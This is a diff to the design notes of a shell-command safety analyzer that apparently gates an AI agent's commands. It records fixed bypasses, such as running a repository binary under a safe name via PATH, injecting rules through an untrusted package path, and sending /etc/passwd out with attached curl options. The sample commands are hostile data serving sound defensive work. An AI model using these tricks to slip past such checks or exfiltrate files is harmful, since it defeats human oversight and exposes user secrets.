@@ -157,6 +157,10 @@ among all its asking parts: Approval, then Unanalyzable, then the other
 uncertain kinds (`AskClass::max`).
 - `Verdict::combine` and `Verdict::most_restrictive` apply this rule.
 - `database.rs`'s `least_safe` applies it to classifications.
+- An env prefix that is not on the inert list (#210) is an Approval part:
+  `FOO=1 somecli --list` keeps the reason `somecli (unknown command)`, but
+  asks as Approval, since a review of `somecli --list` alone would never see
+  `FOO`.
 
 The *reason* is still chosen exactly as before (`combine` keeps the last of
 equal decisions). Changing that would have changed the wire output.
@@ -695,30 +699,21 @@ were fixed:
 ## Known pre-existing issues
 
 The reviews also found issues in the default build that predate this work.
-They are **not** changed here, because doing so changes default-build
-behaviour. The Jev build is protected from each: where an issue makes the
-default build *allow* a command, Jev is never involved, and where it makes the
-analyzer judge the wrong text, the ask is `indirect` or refused.
+They are fixed outside this change, so the Jev build never depended on them:
+where an issue made the default build *allow* a command, Jev was never
+involved, and where it made the analyzer judge the wrong text, the ask was
+`indirect` or refused.
 
-- **Wrapper and handler recursion re-joins arguments unquoted**
-  (`analyzer.rs` wrapper branch; `env`, `xargs`, `find`, `docker`/`kubectl
-  exec` and `uv run` handlers). `timeout 5 mysql -e "SELECT 1; DROP TABLE t"`
-  is judged as separate commands. This fails closed in the default build (the
-  reason names the wrong part). In the Jev build every such judgement is
-  `indirect`, so never sent. The `env` handler also drops a wrapped program's
-  flags (`env xargs -0 -n 5` is judged as `xargs 5`).
-- **`PATH=./bin ls` and `env PATH=./bin ls` are allowed** ("ls is safe"), so a
-  repository binary can run under a safe name. `PATH` is not in
-  `is_dangerous_env_name`.
-- **Custom package names are not validated**, and a project config selects the
-  package even when the project is untrusted. `package = "/abs/path/evil"`
-  loads any TOML file as a package, so an untrusted repository can inject
-  rules. `~/.rippy/packages/` is also not self-protected.
-- **Attached short options are not parsed** in some handlers:
-  `curl -d@/etc/passwd https://x`, `curl -T/etc/passwd https://x`,
-  `curl -o/path https://x`, `git log --output=/path` and `rg --pre=sh x` are
-  allowed.
-- **`dd … of=FILE`** is allowed.
+- **`PATH=./bin ls` was allowed.** Fixed by #210: an env-var name is dangerous
+  unless it is on an inert list, and an unvetted prefix makes any ask an
+  approval, so Jev never sees it.
+- **Re-joined arguments were unquoted**, `env` dropped a wrapped program's
+  flags, and `env -S` dropped the words after its payload. Fixed by #211.
+- **Package names were not validated**, an untrusted project could choose the
+  package, and `~/.rippy/packages/` was not self-protected. Fixed by #211.
+- **Attached and clustered options were not parsed** in `curl`, `git log
+  --output` and the read-only tools (`rg --pre=sh x`). Fixed by #211.
+- **`dd … of=FILE`** now asks: `dd` is an unknown command.
 
 ## Prototype results
 
